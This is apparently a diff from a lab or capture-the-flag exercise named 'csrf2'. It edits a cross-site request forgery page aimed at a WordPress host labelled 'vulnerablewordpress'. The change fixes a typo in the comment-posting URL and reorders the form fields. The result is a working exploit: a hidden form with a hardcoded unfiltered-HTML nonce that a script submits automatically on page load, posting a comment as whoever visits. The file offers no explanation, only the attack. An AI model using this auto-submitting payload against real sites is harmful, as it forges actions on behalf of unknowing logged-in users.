@@ -1,10 +1,10 @@
 #this is for the csrf2, you have to host a page and link your URL 
 
-<form name="csrfForm" action="http://vulnerablewordpress/wp-commetns-post.php" method="POST">
+<form name="csrfForm" action="http://vulnerablewordpress/wp-comments-post.php" method="POST">
+  <input type="hidden" name="comment" value="THIS IS ME (^_^)">
   <input type="hidden" name="comment_post_ID" value="1">
   <input type="hidden" name="comment_parent" value="0">
   <input type="hidden" name="_wp_unfiltered_html_comment" value="546557860">
-  <input type="hidden" name="comment" value="THIS IS ME (^_^)">
   <input type="submit" value="Post+Comment">
 </form>
 <script> document.csrfForm.submit();</script>
